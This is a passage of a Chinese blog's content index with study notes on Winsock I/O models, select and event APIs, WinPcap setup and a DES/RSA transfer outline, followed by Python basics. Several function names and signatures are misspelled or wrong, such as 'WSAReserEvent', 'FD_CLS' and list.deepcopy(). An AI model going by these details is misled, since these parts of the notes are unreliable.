dwMilliseconds：指定要等待的毫秒数。如设为零，表示立即返回。如指定常数INFINITE，则可根据实际情况无限等待下去。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.等待一组事件变为通知态</span></span><br><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD nCount,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">const</span> HANDLE* lpHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">BOO bWaitAll,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// nCount：监控对象的个数</span></span><br><span class="line"><span class="comment">// lpHandles：一组对象句柄的指针</span></span><br><span class="line"><span class="comment">// bWaitAll：是否等待全部符合条件，如果为TRUE，表示除非事件都变成通知态，否则就一直等待下去；如果FALSE，表示只要有一个事件都变成通知态，就立即返回</span></span><br><span class="line"><span class="comment">// dwMilliseconds：指定要等待的毫秒数。如设为零，表示立即返回。如指定常数INFINITE，则可根据实际情况无限等待下去</span></span><br></pre></td></tr></table></figure></li><li><p><a href="https://blog.csdn.net/qq_31094099/article/details/80307113">事件实例</a></p></li></ul><hr><h2 id="三、拓展处理"><a href="#三、拓展处理" class="headerlink" title="三、拓展处理"></a>三、拓展处理</h2><h3 id="1-TCP"><a href="#1-TCP" class="headerlink" title="1 TCP"></a>1 TCP</h3><ul><li><p>TCP的流传输控制</p></li><li><p>面向连接程序的可靠性保护</p></li></ul><h3 id="2-UDP"><a href="#2-UDP" class="headerlink" title="2 UDP"></a>2 UDP</h3><ul><li><p>可靠性</p></li><li><p>并发性</p></li></ul><hr><h2 id="四、I-O操作"><a href="#四、I-O操作" class="headerlink" title="四、I/O操作"></a>四、I/O操作</h2><h3 id="1-阻塞I-O模型"><a href="#1-阻塞I-O模型" class="headerlink" title="1 阻塞I/O模型"></a>1 阻塞I/O模型</h3><ul><li>通信过程<ol><li>初始化</li><li>recv()</li><li>return<ul><li>0 关闭</li><li>>0 请求—&gt;重复</li><li>&lt;0 处理错误</li></ul></li></ol></li></ul><h3 id="2-非阻塞I-O模型"><a href="#2-非阻塞I-O模型" class="headerlink" title="2 非阻塞I/O模型"></a>2 非阻塞I/O模型</h3><ul><li><p>通信过程</p><ol><li>初始化</li><li>recv()</li><li>return <ul><li>0：关闭</li><li>>0：请求—&gt;重复</li><li>&lt;0：WSAEWOULD重复  |  其他 处理错误</li></ul></li></ol></li><li><p>设置非阻塞</p><blockquote><p>函数在第二章。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置非阻塞</span></span><br><span class="line"><span class="type">int</span> iMode = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> iResult = <span class="built_in">ioctlsocket</span>(s,FIONBIO,(u_long*)&amp;iMode);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-I-O复用模型"><a href="#3-I-O复用模型" class="headerlink" title="3 I/O复用模型"></a>3 I/O复用模型</h3><ul><li><p>通信过程：等待事件</p></li><li><p>复用函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 事件结构：数量，套接字（FD_SETSIZE = 64）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">fd_set</span></span><br><span class="line">&#123;</span><br><span class="line">    u_int fd_count;</span><br><span class="line">    SOCKET fd_array[FD_SETSIZE];</span><br><span class="line">&#125;fd_set;</span><br><span class="line"><span class="function">in <span class="title">select</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">int</span> nfds,</span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* readfds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* writefds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __int_out fd_set* execptfds, </span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> <span class="keyword">struct</span> timeval* timeout </span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// nfds：为了与Berkeley套接字兼容保留的，执行时被忽略（填0）。</span></span><br><span class="line"><span class="comment">// readfds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// writefds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// execptfds：指定一个套接字集合，可读性（连接请求，有数据可读，连接关闭、重置或终止）。</span></span><br><span class="line"><span class="comment">// timeout：等待时间，阻塞模式设置NULL表示无限长。</span></span><br><span class="line"><span class="comment">// 函数返回发送网络事件的所有套接字数量综合，超时返回0，错误返回SOCKET_ERROR。</span></span><br><span class="line"><span class="comment">// 填入的套接字集合会只留下发生了网络事件的套接字。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从set中删除s</span></span><br><span class="line"><span class="built_in">FD_CLS</span>(s,*set);</span><br><span class="line"><span class="comment">// s if in set</span></span><br><span class="line"><span class="built_in">FD_ISSET</span>(s,*set);</span><br><span class="line"><span class="comment">// 从set中加入s</span></span><br><span class="line"><span class="built_in">FD_SET</span>(s,*set);</span><br><span class="line"><span class="comment">// 将set置空</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(*set);</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-基于消息的WSAAsyncSelect模型"><a href="#4-基于消息的WSAAsyncSelect模型" class="headerlink" title="4 基于消息的WSAAsyncSelect模型"></a>4 基于消息的WSAAsyncSelect模型</h3><h3 id="5-基于事件的WSAEventSelect模型"><a href="#5-基于事件的WSAEventSelect模型" class="headerlink" title="5 基于事件的WSAEventSelect模型"></a>5 基于事件的WSAEventSelect模型</h3><ul><li><p>通信过程：等待事件</p></li><li><p>事件函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建事件对象（事件处于人工重置模式和未授信状态）</span></span><br><span class="line"><span class="function">WSAEVENT <span class="title">WSACreateEvent</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 设为未授信，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSAReserEvent</span><span class="params">(__in WSAEVENT hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 设为已授信，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSAReserEvent</span><span class="params">(__in WSAEVENT hEvent)</span></span>;</span><br><span class="line"><span class="comment">// 关闭事件对象，成功返回TRUE</span></span><br><span class="line"><span class="function">BOOL <span class="title">WSACloseEvent</span><span class="params">( __in WSAEVENT hEvent )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定监视事件到套接字和事件对象中（多个事件用 | 关联）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAEventSelect</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__int SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in WSAEVENT hEventObject, <span class="comment">// 与网络事件集合关联的事件对象句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">long</span> lNetworkEvents <span class="comment">// 感兴趣事件集合</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回SOCKET_ERROR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待事件</span></span><br><span class="line"><span class="function">DWORD <span class="title">WSAWaitForMultipleEvents</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in DWORD cEvents, <span class="comment">// 指定参数lphEvents指向的数组中包含的事件对象句柄的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in <span class="type">const</span> WSAEVENT* lphEvents, <span class="comment">// 指向事件对象句柄数组的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in BOOL fWaitAll, <span class="comment">// True：lphEvents事件全变为已授信才返回，False：有一个已授信就返回</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in DWORD dwTimeout, <span class="comment">// 超时时间,WSA_INFINITE无限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in BOOL fAlertable <span class="comment">// 指定当完成例程在系统队列中排队等待执行时函数是否返回，TRUE返回时例程已经被执行，FALSE则说明未被执行。（事件模型中填FALSE）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 返回值</span></span><br><span class="line"><span class="comment">// WSA_WAIT_TIMEOUT：超时</span></span><br><span class="line"><span class="comment">// WSA_WAIT_FAILED：失败，检查参数</span></span><br><span class="line"><span class="comment">// 返回索引（返回授信事件的索引），该值需要减去</span></span><br><span class="line"><span class="comment">// WSA_WAIT_EVENT_0才是正确索引（一般该宏值为0）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举事件</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WSANETWORKEVENTS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> lNetworkEvents; <span class="comment">// 已发生的网络事件</span></span><br><span class="line">    <span class="type">int</span> iErrorCode[FD_MAX_EVENTS]; <span class="comment">// 存事件的相关出错码</span></span><br><span class="line">&#125;WSANETWORKEVENTS,*LPWSANETWORKEVENTS;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAEnumNetworkEvents</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in SOCKET s, <span class="comment">// 套接字</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __in WSAEVENT hEventObject, <span class="comment">// 需复位的相应事件对象，指定了本函数会重置这个事件对象的状态</span></span></span></span><br><span class="line"><span class="params"><span class="function">    __out LPWSANETWORKEVENTS lpNetworkEvents <span class="comment">// 一个WSANETWORKEVENTS结构的数组，每个元素记录了一个网络事件和相应的出错码</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回SOCKET_ERROR</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="6-重叠I-O模型"><a href="#6-重叠I-O模型" class="headerlink" title="6 重叠I/O模型"></a>6 重叠I/O模型</h3><h3 id="7-完成端口模型"><a href="#7-完成端口模型" class="headerlink" title="7 完成端口模型"></a>7 完成端口模型</h3><hr><h2 id="五、WinPcap编程"><a href="#五、WinPcap编程" class="headerlink" title="五、WinPcap编程"></a>五、WinPcap编程</h2><h3 id="1-Winpcap基础"><a href="#1-Winpcap基础" class="headerlink" title="1 Winpcap基础"></a>1 Winpcap基础</h3><h3 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h3><blockquote><p><a href="https://www.jianshu.com/p/c57d270648b4">无法打开”sys/time.h”</a></p></blockquote><ol><li>C/C++ 常规：附加包含目录 Include</li><li>链接器 常规：附加库目录 Lib [ /64x ]</li><li>连接器 输入：附加依赖项目 Packet.lib;wpcap.lib;ws2_32.lib</li></ol><h3 id="3-wpcap-dll"><a href="#3-wpcap-dll" class="headerlink" title="3 wpcap.dll"></a>3 wpcap.dll</h3><h3 id="4-Packet-dll"><a href="#4-Packet-dll" class="headerlink" title="4 Packet.dll"></a>4 Packet.dll</h3><hr><h2 id="六、端口扫描"><a href="#六、端口扫描" class="headerlink" title="六、端口扫描"></a>六、端口扫描</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h3><h3 id="2-工具"><a href="#2-工具" class="headerlink" title="2 工具"></a>2 工具</h3><h3 id="3-实现"><a href="#3-实现" class="headerlink" title="3 实现"></a>3 实现</h3><hr><h2 id="七、网络安全传输"><a href="#七、网络安全传输" class="headerlink" title="七、网络安全传输"></a>七、网络安全传输</h2><ul><li><p>流程<img src="/posts/4962e50b/安全编程流程.jpg" alt="img"></p></li><li><p>主要功能</p><blockquote><p>使用DES和RSA混合加密传输网络数据。客户端为数据发送端，服务器端为数据接收端。</p></blockquote></li><li><p>客户端主要步骤</p><ol><li>接收公钥并返回确认。</li><li>生成DES的密钥。</li><li>用户输入发送数据。</li><li>使用DES密钥加密数据。</li><li>使用RSA公钥加密DES密钥。</li><li>将将被加密的密钥和被加密的数据一起发送给服务器。</li></ol></li><li><p>服务器端主要步骤</p><ol><li>生成RSA的公钥私钥对。</li><li>发送公钥给客户端。</li><li>接收被加密的密钥和数据并返回确认。</li><li>使用私钥解密DES密钥。</li><li>使用DES密钥解密数据。</li><li>显示数据。</li></ol></li></ul><hr><h2 id="八、实例"><a href="#八、实例" class="headerlink" title="八、实例"></a>八、实例</h2><ul><li><a href="https://github.com/Magialeaf/Course/tree/main/Network_Programming">my::全部实例</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> C </tag>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python</title>
      <link href="/posts/a378bd8e.html"/>
      <url>/posts/a378bd8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><blockquote><p><a href="https://www.runoob.com/python3/python3-tutorial.html">Python教程1</a>    <a href="https://docs.python.org/zh-cn/3.10/">official::Python教程</a></p><p><a href="https://www.toolnb.com/tools/pyc.html">反编译</a></p><p><a href=".\4b0178e0">text::数据结构与算法</a> </p></blockquote><hr><h2 id="〇、基本概念"><a href="#〇、基本概念" class="headerlink" title="〇、基本概念"></a>〇、基本概念</h2><blockquote><p>静态语言 编译 先编译再执行 例：C</p><p>脚本语言 解释 边编译边执行 例：python</p></blockquote><h3 id="1-pyCharm"><a href="#1-pyCharm" class="headerlink" title="1 pyCharm"></a>1 pyCharm</h3><blockquote><p>设置中文：File——Setting——Plugins——Chinese (Simplified) Language Pack</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pyCharm中设置代码模板：设置——编辑器——模板——Python Script</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Time: $&#123;DATE&#125; $&#123;TIME&#125;</span></span><br><span class="line"><span class="comment">#@Author: author</span></span><br><span class="line"><span class="comment">#@File: $&#123;NAME&#125;.py</span></span><br><span class="line"><span class="comment">#@Software: $&#123;PRODUCT_NAME&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pyCharm快速添加引号：</span><br><span class="line">    1. ctrl + r</span><br><span class="line">    2. 上方填入(.*?):(.*)，选择正则表达式</span><br><span class="line">    3. 下方填入&#x27;$1&#x27;:&#x27;$2&#x27;</span><br></pre></td></tr></table></figure><h3 id="2-类型"><a href="#2-类型" class="headerlink" title="2 类型"></a>2 类型</h3><blockquote><p>不可变数据类型：Number、String、Tuple。</p><p>可变数据类型：List、Dictionary、Set。</p><p>可变数据类型在值变化后地址不会改变。不可变数据类型在值变化后会重新开辟空间并修改地址。</p></blockquote><h3 id="3-常见语句"><a href="#3-常见语句" class="headerlink" title="3 常见语句"></a>3 常见语句</h3><blockquote><p>print：<a href="https://www.cnblogs.com/dongye95/p/10197916.html">使用</a>  <a href="https://www.runoob.com/python3/python-func-print.html">参数设置</a></p><p><a href="https://blog.csdn.net/PSpiritV/article/details/124388044">pass / …的用法</a></p><p>todo：待做。pyCharm中点击下方todo可以看到所有todo。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出</span></span><br><span class="line"><span class="string">格式：print(*objects, sep=&#x27; &#x27;, end=&#x27;\n&#x27;, file=sys.stdout, flush=False)</span></span><br><span class="line"><span class="string">objects -- 复数，表示可以一次输出多个对象。输出多个对象时，需要用 , 分隔。</span></span><br><span class="line"><span class="string">sep -- 用来间隔多个对象，默认值是一个空格。</span></span><br><span class="line"><span class="string">end -- 用来设定以什么结尾。默认值是换行符 \n，我们可以换成其他字符串。</span></span><br><span class="line"><span class="string">file -- 要写入的文件对象。</span></span><br><span class="line"><span class="string">flush -- 输出是否被缓存通常决定于 file，但如果 flush 关键字参数为 True，流会被强制刷新。</span></span><br><span class="line"><span class="string">输出百分号的方法：%%</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入（结果为字符串）</span></span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算eval()中的字符串值（数字，列表，字典，元组皆可）（字符串会被当做变量）</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放变量（不可以删集合元素）</span></span><br><span class="line"><span class="keyword">del</span> variable[index]</span><br><span class="line"></span><br><span class="line">__init__ <span class="comment"># 类的初始化数据</span></span><br><span class="line">__doc__ <span class="comment"># 查看函数属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># match选择</span></span><br><span class="line"><span class="keyword">match</span> num:     <span class="comment"># switch </span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:    <span class="comment"># 自带 break</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> _:    <span class="comment">#  default</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 函数内赋值（:=）</span></span><br><span class="line"><span class="built_in">print</span>( val := function() , val ** <span class="number">2</span> )</span><br><span class="line"><span class="keyword">if</span> (length := <span class="built_in">len</span>(string)) &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 普通的数据处理</span></span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h3 id="4-常用函数"><a href="#4-常用函数" class="headerlink" title="4 常用函数"></a>4 常用函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断类型是否相同（可以多重匹配）</span></span><br><span class="line"><span class="built_in">isinstance</span> (a,<span class="built_in">int</span>)</span><br><span class="line"><span class="built_in">isinstance</span> (a,<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">isinstance</span> (a,(<span class="built_in">str</span>,<span class="built_in">int</span>,<span class="built_in">list</span>)) <span class="comment"># 是元组中的一个返回 True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法并取余</span></span><br><span class="line">quotient , remainder = <span class="built_in">divmod</span>( dividend , divisor )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符转ASCII码</span></span><br><span class="line"><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="comment"># ASCII码转字符</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">65</span>)</span><br></pre></td></tr></table></figure><h3 id="5-内存"><a href="#5-内存" class="headerlink" title="5 内存"></a>5 内存</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python中对于小整数对象有一个小整数对象池，范围在[-5,257)之间。对于在这个范围内的整数，不会新建对象，直接从小整数对象池中取就行。 </span></span><br><span class="line">lst1 = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">lst2 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(lst1[<span class="number">0</span>]) == <span class="built_in">id</span>(lst2[<span class="number">3</span>])) <span class="comment"># 返回True</span></span><br></pre></td></tr></table></figure><hr><h2 id="二、字符串"><a href="#二、字符串" class="headerlink" title="二、字符串"></a>二、字符串</h2><h3 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1 普通函数"></a>1 普通函数</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/143426682">字符串函数</a>     <a href="https://zhuanlan.zhihu.com/p/515946321">格式化输出</a> </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化输出</span></span><br><span class="line"><span class="comment"># &#123; [index][ : [ [fill] align] [sign] [#] [width] [.precision] [type] ] &#125;</span></span><br><span class="line"><span class="built_in">str</span>.<span class="built_in">format</span>(args)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把s按seq分隔符分割[ num 个]数据存在列表中</span></span><br><span class="line">s.split(sep,[ num ])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从左右去除字符（只要字符在str中就会去除），直到某个s中的字符不在str中便停止</span></span><br><span class="line">s.strip([<span class="string">&quot;str&quot;</span>])</span><br><span class="line">s.lstrip([<span class="string">&quot;str&quot;</span>]) <span class="comment"># 只去左边</span></span><br><span class="line">s.rstrip([<span class="string">&quot;str&quot;</span>]) <span class="comment"># 只去右边</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把seq按 &quot;&quot; 中的东西组成新字符串</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.join(seq)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否是数字</span></span><br><span class="line">s.isdigit() ：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计字符串在s中出现次数</span></span><br><span class="line">s.count(<span class="string">&quot;str&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回子串出现在s的位置，没找到会报错</span></span><br><span class="line">s.index(<span class="string">&quot;str&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 旧字符换新，最多max次</span></span><br><span class="line">s.replace(old, new[, <span class="built_in">max</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串获得子串</span></span><br><span class="line">s = s[::]</span><br></pre></td></tr></table></figure><h3 id="2-字符串前的符号"><a href="#2-字符串前的符号" class="headerlink" title="2 字符串前的符号"></a>2 字符串前的符号</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 后面的字符串会以Unicode格式进行编码，常用于中文</span></span><br><span class="line"><span class="string">u&quot;str&quot;</span></span><br><span class="line"><span class="comment"># 去掉转义功能</span></span><br><span class="line"><span class="string">r&quot;str&quot;</span></span><br><span class="line"><span class="comment"># 字符串是 bytes 类型，用于网络传输中</span></span><br><span class="line"><span class="string">b&quot;str&quot;</span></span><br><span class="line"><span class="comment"># 识别 str 中的格式化输出</span></span><br><span class="line"><span class="string">f&quot;str&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line">lst= [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(lst, <span class="string">f&#x27;has a length of <span class="subst">&#123;<span class="built_in">len</span>(lst)&#125;</span>.&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="三、列表与元组"><a href="#三、列表与元组" class="headerlink" title="三、列表与元组"></a>三、列表与元组</h2><h3 id="1-列表"><a href="#1-列表" class="headerlink" title="1 列表"></a>1 列表</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/351605959">普通函数</a></p><p><a href="https://zhuanlan.zhihu.com/p/388243108">浅拷贝和深拷贝</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可变数组</span></span><br><span class="line"><span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝</span></span><br><span class="line"><span class="comment"># 两者id相同。</span></span><br><span class="line">a = b </span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维列表复制不关联，二维依旧关联。</span></span><br><span class="line">a = b.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 深拷贝，二维也不关联。</span></span><br><span class="line">a = b.deepcopy() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除列表元素</span></span><br><span class="line"><span class="keyword">del</span>(lst[index])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 追加</span></span><br><span class="line">lst.append(x)<span class="comment"># 追加单个元素</span></span><br><span class="line">lst.extend(lst)<span class="comment"># 追加多个元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">lst.pop([index]) <span class="comment"># 默认弹出尾部元素，也可以的自定义位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序（默认升序）</span></span><br><span class="line">lst.sort(reverse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转</span></span><br><span class="line">lst.reverse()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计某个元素的个数</span></span><br><span class="line">lst.count(val)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表第一列排序（指定列排序）</span></span><br><span class="line">lst.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="2-元组"><a href="#2-元组" class="headerlink" title="2 元组"></a>2 元组</h3><blockquote><p>元素不可被修改（列表可以用extend扩展）的列表（只可拼接）：tuple()</p><p>括号可以省略。</p><p>当元组中只有一个元素时，逗号不可省略。（ tup = (1,) ）</p><p><a href="https://zhuanlan.zhihu.com/p/498413520">map()</a></p><p><a href="https://www.runoob.com/python/python-func-zip.html">zip()</a></p><p><a href="https://www.runoob.com/python/python-func-enumerate.html">enumerate()</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据提供的函数对指定序列做映射</span></span><br><span class="line"><span class="built_in">map</span>()</span><br><span class="line"><span class="built_in">map</span>(<span class="built_in">iter</span>,<span class="built_in">type</span>)</span><br><span class="line"><span class="built_in">map</span>(<span class="built_in">list</span>,<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表</span></span><br><span class="line"><span class="built_in">zip</span>()</span><br><span class="line"><span class="built_in">zip</span>(<span class="built_in">iter</span>[,<span class="built_in">iter</span>...])</span><br><span class="line"><span class="built_in">zip</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于将一个可遍历的数据对象（如列表、元组或字符串）组合为一个索引序列。（每个值为一个元组（索引，值））</span></span><br><span class="line"><span class="keyword">for</span> idx,num <span class="keyword">in</span> <span class="built_in">enumerate</span>(lst):</span><br><span class="line">    <span class="built_in">print</span>(idx,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解包（二维列表用：zip(*lst)会获得每一列的值）</span></span><br><span class="line">* + 可迭代对象</span><br><span class="line">*<span class="built_in">zip</span>(lst)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组嵌套</span></span><br><span class="line"><span class="comment"># 判断嵌套元组中是否存在某元素值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_value_in_nested_tuple</span>(<span class="params">value, nested_tuple</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> nested_tuple:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">tuple</span>):  <span class="comment"># 如果当前元素是嵌套元组，则递归调用本函数</span></span><br><span class="line">            <span class="keyword">if</span> is_value_in_nested_tuple(value, item):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> item == value:  <span class="comment"># 如果当前元素与指定值相等，则返回True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 遍历完所有元素都没有找到指定值，则返回False</span></span><br></pre></td></tr></table></figure><hr><h2 id="四、字典与集合"><a href="#四、字典与集合" class="headerlink" title="四、字典与集合"></a>四、字典与集合</h2><h3 id="1-字典"><a href="#1-字典" class="headerlink" title="1 字典"></a>1 字典</h3><blockquote><p>键值对，dict()</p><p><a href="https://zhuanlan.zhihu.com/p/355601478">Counter()</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 普通方法</span></span><br><span class="line"><span class="comment"># 返回所有键信息</span></span><br><span class="line">dic.keys()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回所有值信息</span></span><br><span class="line">dic.values()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回所有键值对（元组形式）</span></span><br><span class="line">dic.items()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值，不存在返回默认</span></span><br><span class="line">dic.get(key,default)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值，删除键值对，不存在返回默认</span></span><br><span class="line">dic.pop(key,default)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除最后一个键值对，返回元组</span></span><br><span class="line">dic.popitem()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空</span></span><br><span class="line">dic.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 浅/深拷贝</span></span><br><span class="line">dic.copy()/.deepcopy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按字典2的方式更新字典1</span></span><br><span class="line">dic.update(dicts2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回key对应的值，key不存在返回default</span></span><br><span class="line">dic.get(key, default=<span 